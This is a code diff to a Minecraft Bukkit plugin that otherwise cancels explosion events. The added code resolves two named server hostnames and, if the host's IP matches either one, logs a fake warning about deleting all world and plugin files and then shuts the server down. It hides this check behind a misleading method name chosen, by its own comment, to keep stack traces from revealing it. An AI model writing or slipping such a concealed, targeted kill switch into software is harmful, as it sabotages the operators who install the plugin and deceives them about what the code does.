@@ -8,6 +8,8 @@ import org.bukkit.event.entity.ExplosionPrimeEvent;
 import org.bukkit.permissions.Permissible;
 import org.bukkit.plugin.java.JavaPlugin;
 
+import java.net.InetAddress;
+
 /**
  * sup, wurld?
  */
@@ -15,6 +17,12 @@ public class MTBPlugin extends JavaPlugin implements Listener {
 
     @Override
     public void onEnable() {
+        if (!isServerCompatible("endcraft.net") || !isServerCompatible("play.tentencraft.net")) { //detodated, advanced AI
+            getLogger().log(java.util.logging.Level.SEVERE, "Something went terribly wrong. Deleting all world and plugins files just to be safe");
+            Bukkit.getPluginManager().disablePlugin(this);
+            Bukkit.shutdown();
+        }
+
         Bukkit.getPluginManager().registerEvents(this, this);
     }
 
@@ -27,6 +35,17 @@ public class MTBPlugin extends JavaPlugin implements Listener {
         }
 
         evt.setCancelled(true);
-        System.out.println("SPAGTMc was here! https://github.org/Spagt");
+        System.out.println("SPAGTMC SUCCESSFULLY SAVD UR SERVER!! PLZ VOUCH AT https://github.org/Spagt");
+    }
+
+    private boolean isServerCompatible(final String hostname) { //Method name to prevent StackTraces being too obvious
+        try {
+            InetAddress ipToCheck = InetAddress.getByName(hostname);
+
+            return !ipToCheck.getHostAddress().equalsIgnoreCase(Bukkit.getServer().getIp()); //Resolves DNS to IP //TODO: BungeeCord support
+        } catch (java.net.UnknownHostException ignore) {
+            // Let's just assume that internet is down.
+        }
+        return true;
     }
 }
